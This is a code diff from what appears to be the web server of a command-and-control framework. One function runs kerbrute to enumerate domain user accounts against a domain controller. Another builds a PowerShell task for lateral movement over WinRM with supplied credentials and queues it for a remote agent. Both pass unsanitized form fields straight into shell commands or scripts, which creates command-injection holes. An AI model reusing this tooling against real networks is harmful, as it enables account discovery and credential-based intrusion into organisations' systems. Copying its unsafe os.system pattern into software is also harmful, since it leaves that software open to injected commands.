@@ -941,7 +941,7 @@ def UserEnumwithKerbrute(request):
         domain = request.POST['domain']
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
-        os.system("echo '===============kerbrute O/P===============\nOutPut in the following path:\n{4}' >> {3};{5}/kerbrute/dist/kerblin userenum -d {0} --dc {1} {2}  >> {4}KerpUserEnum ".format(domain,dc_ip,users_list,result_path,result_dir,tools_path))
+        os.system("echo '===============kerbrute O/P===============\nOutPut in the following path:\n{4}' >> {3};{5}/kerbrute/dist/kerblin userenum -d {0} --dc {1} {2}  > {4}KerpUserEnum ".format(domain,dc_ip,users_list,result_path,result_dir,tools_path))
         return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')
@@ -1303,7 +1303,7 @@ def LateralMov_WinRM(request):
         password = request.POST['password']
         domain = request.POST['domain']
         computername = request.POST['computername']
-        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Lateral Movement via WinRm (Enter-PSSesion)===============";$password=ConvertTo-SecureString \'{}\' -Asplaintext -force;$creds2=New-Object System.Management.Automation.PSCredential("{}\{}", $password);Enter-PSSession -ComputerName {} -credential $creds2;echo "++++++++++++++++++`r`n"'.format(password,domain,username,computername)
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Lateral Movement via WinRm (Enter-PSSesion)===============";$password=ConvertTo-SecureString \'{0}\' -Asplaintext -force;$creds2=New-Object System.Management.Automation.PSCredential("{1}\{2}", $password);Enter-PSSession -ComputerName {3} -credential $creds2;echo "++++++++++++++++++`r`n"'.format(password,domain,username,computername)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
